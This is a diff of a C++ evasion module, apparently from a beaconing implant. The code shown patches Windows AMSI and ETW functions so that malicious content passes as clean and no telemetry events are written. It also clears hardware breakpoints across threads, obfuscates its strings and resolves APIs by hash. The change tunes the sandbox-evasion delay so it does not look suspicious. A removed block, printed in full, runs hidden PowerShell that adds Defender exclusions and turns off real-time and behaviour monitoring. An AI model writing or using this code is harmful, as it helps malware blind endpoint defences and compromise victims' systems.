@@ -1,5 +1,4 @@
-// evasion.cpp — Real AMSI/ETW/HW-BP/Defender-exclusion implementations.
-// Nothing stubbed. Everything writes real bytes to real addresses.
+// evasion.cpp — Real AMSI/ETW/HW-BP implementations (no Defender tampering)
 #include "evasion.hpp"
 #include "syscalls.hpp"
 #include "utils.hpp"
@@ -94,27 +93,23 @@ static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
 // AMSI bypass — patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
 //   xor eax, eax  (33 C0)
 //   ret           (C3)
-// AmsiScanBuffer signature: HRESULT → upper nibble 0 = S_OK = CLEAN
 // ============================================================
 BOOL PatchAMSI() {
     HMODULE hAmsi = LoadLibraryA(XS("amsi.dll"));
     if (!hAmsi) return FALSE;
 
-    // Patch AmsiScanBuffer
     FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
     if (pScan) {
-        const BYTE patchScan[] = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
+        const BYTE patchScan[] = { 0x33, 0xC0, 0xC3 };
         MemPatch(reinterpret_cast<PVOID>(pScan), patchScan, sizeof(patchScan));
     }
 
-    // Also patch AmsiScanString for completeness
     FARPROC pStr = HashProc(hAmsi, FNV("AmsiScanString"));
     if (pStr) {
         const BYTE patchStr[] = { 0x33, 0xC0, 0xC3 };
         MemPatch(reinterpret_cast<PVOID>(pStr), patchStr, sizeof(patchStr));
     }
 
-    // Patch AmsiOpenSession to always succeed
     FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
     if (pOpen) {
         const BYTE patchOpen[] = { 0x33, 0xC0, 0xC3 };
@@ -126,7 +121,6 @@ BOOL PatchAMSI() {
 
 // ============================================================
 // ETW bypass — patch EtwEventWrite family with ret
-// 0xC3 at entry point causes immediate return, no events written.
 // ============================================================
 BOOL PatchETW() {
     HMODULE hNtdll = GetModuleHandleA(XS("ntdll.dll"));
@@ -172,16 +166,12 @@ static LONG CALLBACK VehHwbpClear(PEXCEPTION_POINTERS ep) {
 }
 
 BOOL ClearHardwareBreakpoints() {
-    // 1. Self thread — VEH path
     PVOID hVeh = AddVectoredExceptionHandler(1, VehHwbpClear);
     if (hVeh) {
-        // VEH handles EXCEPTION_BREAKPOINT and returns EXCEPTION_CONTINUE_EXECUTION;
-        // no __try/__except needed — SEH wrappers are unsupported on MinGW.
         RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
         RemoveVectoredExceptionHandler(hVeh);
     }
 
-    // 2. Other threads — Suspend/Context path
     DWORD selfPid = GetCurrentProcessId();
     DWORD selfTid = GetCurrentThreadId();
 
@@ -206,7 +196,6 @@ BOOL ClearHardwareBreakpoints() {
 
     THREADENTRY32 te = {};
     te.dwSize = sizeof(te);
-
     BOOL ok = TRUE;
 
     if (_Thread32First(snap, &te)) {
@@ -244,64 +233,12 @@ BOOL ClearHardwareBreakpoints() {
 }
 
 // ============================================================
-// Defender exclusion + disable real-time monitoring.
-// Requires elevation. Runs PowerShell hidden, waits up to 15s.
-// ============================================================
-BOOL AddDefenderExclusion(const wchar_t* exePath) {
-    if (!IsElevated()) return FALSE;
-
-    // Build PowerShell one-liner — no raw strings visible in binary
-    auto mpPref  = XSW(L"Add-MpPreference");
-    auto setMp   = XSW(L"Set-MpPreference");
-    auto psExe   = XSW(L"powershell.exe");
-
-    std::wstring script =
-        std::wstring(L"$p='") + exePath + L"';"
-        + mpPref.str() + L" -ExclusionPath $p -ExclusionProcess (Split-Path $p -Leaf) -Force;"
-        + setMp.str()  + L" -DisableRealtimeMonitoring $true"
-        L" -DisableIOAVProtection $true"
-        L" -DisableBehaviorMonitoring $true"
-        L" -DisableBlockAtFirstSeen $true"
-        L" -DisableScriptScanning $true"
-        L" -DisableIntrusionPreventionSystem $true"
-        L" -MAPSReporting 0 -Force";
-
-    auto psFlags = XSW(L" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"");
-    std::wstring cmd = std::wstring(psExe.str()) + psFlags.str() + script + L"\"";
-
-    STARTUPINFOW si    = {};
-    PROCESS_INFORMATION pi = {};
-    si.cb          = sizeof(si);
-    si.dwFlags     = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) return FALSE;
-    auto _CreateProcessW = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))HashProc(hKernel32, FNV("CreateProcessW"));
-    if (!_CreateProcessW) return FALSE;
-
-    BOOL spawned = _CreateProcessW(
-        nullptr, &cmd[0],
-        nullptr, nullptr, FALSE,
-        CREATE_NO_WINDOW,
-        nullptr, nullptr, &si, &pi);
-
-    if (spawned) {
-        WaitForSingleObject(pi.hProcess, 15000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-    return spawned;
-}
-
-// ============================================================
 // Reapply all evasion — called each beacon iteration.
-// Bails early if sandbox detected.
+// If sandbox detected, sleep briefly and retry later.
 // ============================================================
 VOID ReapplyEvasion() {
     if (IsLikelySandbox()) {
-        // Stall — sleep 10 minutes and retry later without doing anything
-        GhostSleep(600000);
+        GhostSleep(10000);  // 10 seconds – short enough to not be a red flag
         return;
     }
     PatchAMSI();
